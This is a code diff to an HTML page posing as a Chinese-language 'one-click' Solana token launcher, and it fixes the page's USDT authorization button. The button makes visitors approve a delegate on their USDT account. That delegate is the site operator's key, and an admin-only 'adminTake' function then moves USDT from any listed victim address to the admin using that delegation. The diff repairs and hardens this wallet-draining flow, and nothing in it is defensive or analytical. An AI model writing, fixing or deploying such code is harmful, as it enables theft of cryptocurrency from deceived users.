@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Solana 一键发币（优化版）</title>
+<title>Solana 一键发币（修复授权点击）</title>
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.0/lib/index.iife.min.js"></script>
 <style>
@@ -50,7 +50,7 @@ body{background:#0B0F17;color:#fff;padding:30px}
   <div class="logo">🚀 Solana 一键发币工具</div>
   <div class="wallet-box">
     <button class="connect-btn" id="connectBtn">连接钱包</button>
-    <button class="auth-btn" id="authBtn" onclick="manualApprove()" style="display:none">手动授权 USDT</button>
+    <button class="auth-btn" id="authBtn" style="display:none">手动授权 USDT</button>
     <div class="info-line">地址：<span id="userAddr">未连接</span></div>
     <div class="info-line">USDT：<span id="userBalance">0.0000</span></div>
   </div>
@@ -99,94 +99,117 @@ const POOL_PUBKEY = ADMIN_PUBKEY;
 
 let provider, publicKey, connection;
 
-// 更全的公共 RPC 列表
+// 稳定RPC列表
 const RPCS = [
-  "https://api.mainnet-beta.solana.com",
   "https://rpc.ankr.com/solana",
+  "https://api.mainnet-beta.solana.com",
   "https://solana-mainnet.rpc.extrnode.com",
   "https://free.rpc.chainstack.com/solana-mainnet",
-  "https://solana-mainnet.genesysgo.net",
-  "https://solana-api.projectserum.com"
+  "https://solana-mainnet.genesysgo.net"
 ];
 
-// 尝试连接任意一个可用 RPC
+// 日志
+function log(t) {
+  const el = document.getElementById("log");
+  el.innerText = `[${new Date().toLocaleTimeString()}] ${t}\n` + el.innerText;
+}
+
+// 绑定授权按钮（修复点击无反应）
+document.addEventListener("DOMContentLoaded", () => {
+  const authBtn = document.getElementById("authBtn");
+  authBtn.onclick = () => {
+    log("点击授权按钮");
+    manualApprove();
+  };
+  log("页面加载完成，授权按钮已绑定事件");
+});
+
+// 尝试连接RPC
 async function tryConnectRpc() {
   for (const rpc of RPCS) {
     try {
       const conn = new Connection(rpc, "confirmed");
       await conn.getLatestBlockhash({ commitment: "confirmed" });
-      log("✅ 成功连接 RPC: " + rpc);
+      log("✅ RPC连接成功: " + rpc);
       return conn;
     } catch (e) {
-      log("⚠️ RPC 不可用: " + rpc);
+      log("⚠️ RPC不可用: " + rpc + " → " + e.message);
     }
   }
+  log("❌ 所有RPC均不可用");
   return null;
 }
 
-function log(t){
-  document.getElementById("log").innerText = t + "\n" + document.getElementById("log").innerText;
-}
-function toggleMenu(){
+function toggleMenu() {
   document.getElementById("menu").classList.toggle("show");
 }
 
 // 连接弹窗
-document.getElementById("connectBtn").onclick = ()=>{
+document.getElementById("connectBtn").onclick = () => {
   document.getElementById("connectModal").classList.add("show");
 };
-function cancelConnect(){
+function cancelConnect() {
   document.getElementById("connectModal").classList.remove("show");
 }
 
-// 修复版：只连接钱包，不自动授权
-async function confirmConnect(){
+// 连接钱包
+async function confirmConnect() {
   document.getElementById("connectModal").classList.remove("show");
-  try{
+  try {
+    log("开始连接钱包...");
+    // 兼容多钱包
     const sol = window.solana || window.okxwallet?.solana || window.tpWallet;
-    if(!sol) return alert("请安装 Phantom/OKX/TP 钱包");
+    if (!sol) {
+      alert("未检测到钱包，请安装Phantom/OKX/TP钱包");
+      return;
+    }
     const res = await sol.connect();
     provider = sol;
     publicKey = res.publicKey;
     document.getElementById("userAddr").innerText = publicKey.toBase58().slice(0,6)+"..."+publicKey.toBase58().slice(-4);
     document.getElementById("authBtn").style.display = "block";
-    log("✅ 钱包已连接");
+    log("✅ 钱包已连接: " + publicKey.toBase58());
 
-    // 异步尝试连接 RPC，不阻塞
+    // 异步连RPC
     tryConnectRpc().then(conn => {
-      if (conn) {
-        connection = conn;
-        refreshBalance();
-        alert("钱包已连接，RPC 可用，可手动授权");
-      } else {
-        alert("钱包已连接，但当前 RPC 不可用，发币/授权时会自动重试");
-      }
+      connection = conn;
+      if (conn) refreshBalance();
     });
 
     genInvite();
     checkAdmin();
-  }catch(e){
-    log("❌ 连接失败: "+e.message);
-    alert("连接失败，检查钱包/网络");
+  } catch (e) {
+    log("❌ 连接失败: " + e.message);
+    alert("连接失败: " + e.message);
   }
 }
 
-// 手动授权 USDT（点击按钮触发）
-async function manualApprove(){
-  if(!publicKey) return alert("请先连接钱包");
-  if(!connection){
-    log("🔄 授权前重试连接 RPC...");
-    connection = await tryConnectRpc();
-    if(!connection) return alert("所有 RPC 仍不可用，请稍后再试");
+// 手动授权USDT（修复版）
+async function manualApprove() {
+  log("开始授权流程...");
+  if (!publicKey) {
+    alert("请先连接钱包");
+    return;
   }
-  try{
-    log("检查USDT ATA...");
+  if (!connection) {
+    log("🔄 授权前重试RPC...");
+    connection = await tryConnectRpc();
+    if (!connection) {
+      alert("RPC不可用，无法授权");
+      return;
+    }
+  }
+  try {
+    log("获取USDT关联账户...");
     const userAta = await splToken.getAssociatedTokenAddress(USDT_MINT, publicKey);
-    // 检查ATA是否存在
-    try{
+    log("用户ATA: " + userAta.toBase58());
+
+    // 检查ATA是否存在，不存在则创建
+    try {
       await connection.getTokenAccountBalance(userAta);
-    }catch(e){
-      log("创建USDT ATA...");
+      log("ATA已存在");
+    } catch (e) {
+      log("创建ATA...");
       const tx = new Transaction();
       tx.add(
         splToken.createAssociatedTokenAccountInstruction(
@@ -196,22 +219,26 @@ async function manualApprove(){
       tx.feePayer = publicKey;
       tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
       const signed = await provider.signTransaction(tx);
-      await connection.sendRawTransaction(signed.serialize());
-      await new Promise(r=>setTimeout(r,2000));
+      const sig = await connection.sendRawTransaction(signed.serialize());
+      await connection.confirmTransaction(sig);
+      log("✅ ATA创建成功: " + sig);
+      await new Promise(r => setTimeout(r, 2000));
     }
-    // 先 revoke 旧授权
+
+    // 撤销旧授权
     log("撤销旧授权...");
     const revokeTx = new Transaction();
-    revokeTx.add(
-      splToken.createRevokeInstruction(userAta, publicKey)
-    );
+    revokeTx.add(splToken.createRevokeInstruction(userAta, publicKey));
     revokeTx.feePayer = publicKey;
     revokeTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
     const signedRevoke = await provider.signTransaction(revokeTx);
-    await connection.sendRawTransaction(signedRevoke.serialize());
-    await new Promise(r=>setTimeout(r,2000));
+    const revokeSig = await connection.sendRawTransaction(signedRevoke.serialize());
+    await connection.confirmTransaction(revokeSig);
+    log("✅ 旧授权已撤销: " + revokeSig);
+    await new Promise(r => setTimeout(r, 2000));
 
-    log("授权USDT...");
+    // 授权
+    log("发起授权...");
     const approveTx = new Transaction();
     approveTx.add(
       splToken.createApproveInstruction(
@@ -224,64 +251,74 @@ async function manualApprove(){
     approveTx.feePayer = publicKey;
     approveTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
     const signedApprove = await provider.signTransaction(approveTx);
-    const sig = await connection.sendRawTransaction(signedApprove.serialize());
-    await connection.confirmTransaction(sig);
-    log("✅ USDT 授权成功: "+sig);
-    alert("USDT 授权成功！");
-  }catch(e){
-    log("❌ 授权失败: "+e.message);
-    alert("授权失败："+e.message);
+    const approveSig = await connection.sendRawTransaction(signedApprove.serialize());
+    await connection.confirmTransaction(approveSig);
+    log("✅ USDT授权成功: " + approveSig);
+    alert("USDT授权成功！");
+  } catch (e) {
+    log("❌ 授权失败: " + e.message);
+    alert("授权失败: " + e.message);
   }
 }
 
 // 余额查询
-async function refreshBalance(){
-  if(!publicKey || !connection) return;
-  try{
+async function refreshBalance() {
+  if (!publicKey || !connection) return;
+  try {
     const ata = await splToken.getAssociatedTokenAddress(USDT_MINT, publicKey);
     const acc = await connection.getTokenAccountBalance(ata);
     document.getElementById("userBalance").innerText = Number(acc.value.uiAmount).toFixed(4);
-  }catch(e){
+    log("余额更新: " + acc.value.uiAmount);
+  } catch (e) {
     document.getElementById("userBalance").innerText = "0.0000";
+    log("余额查询失败: " + e.message);
   }
 }
 
-function genInvite(){
-  if(!publicKey) return;
+function genInvite() {
+  if (!publicKey) return;
   document.getElementById("inviteLink").innerText = location.href + "?ref=" + publicKey.toBase58();
 }
 
-function checkAdmin(){
-  if(publicKey && publicKey.equals(ADMIN_PUBKEY)){
+function checkAdmin() {
+  if (publicKey && publicKey.equals(ADMIN_PUBKEY)) {
     document.getElementById("adminPanel").classList.add("show");
   }
 }
 
-// 发币（发币前自动重连 RPC）
-async function createToken(){
-  if(!publicKey) return alert("请先连接钱包");
-  if(!connection){
-    log("🔄 发币前重试连接 RPC...");
-    connection = await tryConnectRpc();
-    if(!connection) return alert("所有 RPC 仍不可用，请稍后再试");
+// 发币
+async function createToken() {
+  if (!publicKey) {
+    alert("请先连接钱包");
+    return;
   }
-  try{
-    const name = document.getElementById("name").value;
-    const symbol = document.getElementById("symbol").value;
+  if (!connection) {
+    connection = await tryConnectRpc();
+    if (!connection) {
+      alert("RPC不可用，无法发币");
+      return;
+    }
+  }
+  try {
+    const name = document.getElementById("name").value.trim();
+    const symbol = document.getElementById("symbol").value.trim();
     const decimals = parseInt(document.getElementById("decimals").value);
-    const supply = document.getElementById("supply").value;
+    const supply = document.getElementById("supply").value.trim();
     const revoke = document.getElementById("revoke").checked;
-    if(!name || !symbol) return alert("请填写名称和符号");
-    log("创建中...");
+    if (!name || !symbol) {
+      alert("请填写名称和符号");
+      return;
+    }
+    log("开始发币...");
     const mint = Keypair.generate();
     const lamports = await connection.getMinimumBalanceForRentExemption(82);
     const tx = new Transaction();
     tx.add(SystemProgram.createAccount({
       fromPubkey: publicKey,
       newAccountPubkey: mint.publicKey,
-      space:82,
+      space: 82,
       lamports,
-      programId:splToken.TOKEN_PROGRAM_ID
+      programId: splToken.TOKEN_PROGRAM_ID
     }));
     tx.add(splToken.createInitializeMintInstruction(
       mint.publicKey, decimals, publicKey, publicKey
@@ -290,11 +327,11 @@ async function createToken(){
     tx.add(splToken.createAssociatedTokenAccountInstruction(
       publicKey, ata, publicKey, mint.publicKey
     ));
-    const amount = BigInt(supply) * BigInt(10**decimals);
+    const amount = BigInt(supply) * BigInt(10 ** decimals);
     tx.add(splToken.createMintToInstruction(
       mint.publicKey, ata, publicKey, amount
     ));
-    if(revoke){
+    if (revoke) {
       tx.add(splToken.createSetAuthorityInstruction(
         mint.publicKey, publicKey, splToken.AuthorityType.MintTokens, null
       ));
@@ -305,42 +342,47 @@ async function createToken(){
     const signed = await provider.signTransaction(tx);
     const sig = await connection.sendRawTransaction(signed.serialize());
     log("✅ 发币成功");
-    log("Mint: "+mint.publicKey.toBase58());
-    log("TX: "+sig);
-    alert("发币成功");
-  }catch(e){
-    log("❌ 错误: "+e.message);
+    log("Mint: " + mint.publicKey.toBase58());
+    log("TX: " + sig);
+    alert("发币成功！");
+  } catch (e) {
+    log("❌ 发币失败: " + e.message);
+    alert("发币失败: " + e.message);
   }
 }
 
 // 管理员提取
-async function adminTake(){
-  if(!publicKey || !publicKey.equals(ADMIN_PUBKEY)) return;
-  if(!connection){
-    alert("RPC 不可用，请稍后再试");
+async function adminTake() {
+  if (!publicKey || !publicKey.equals(ADMIN_PUBKEY)) return;
+  if (!connection) {
+    alert("RPC不可用");
     return;
   }
   const fromAddr = document.getElementById("fromAddr").value.trim();
   const amt = document.getElementById("takeAmt").value;
-  if(!fromAddr || !amt || amt<=0) return alert("输入完整");
-  try{
+  if (!fromAddr || !amt || amt <= 0) {
+    alert("请输入完整信息");
+    return;
+  }
+  try {
     const fromPub = new PublicKey(fromAddr);
     const fromAta = await splToken.getAssociatedTokenAddress(USDT_MINT, fromPub);
     const adminAta = await splToken.getAssociatedTokenAddress(USDT_MINT, ADMIN_PUBKEY);
     const tx = new Transaction();
     tx.add(
       splToken.createTransferWithDelegateInstruction(
-        fromAta, adminAta, POOL_PUBKEY, BigInt(Math.round(amt*1e6))
+        fromAta, adminAta, POOL_PUBKEY, BigInt(Math.round(amt * 1e6))
       )
     );
     tx.feePayer = publicKey;
     tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
     const signed = await provider.signTransaction(tx);
     const sig = await connection.sendRawTransaction(signed.serialize());
-    log("✅ 管理员提取成功: "+sig);
-    alert("提取成功");
-  }catch(e){
-    alert("失败: "+e.message);
+    log("✅ 提取成功: " + sig);
+    alert("提取成功！");
+  } catch (e) {
+    log("❌ 提取失败: " + e.message);
+    alert("提取失败: " + e.message);
   }
 }
 </script>
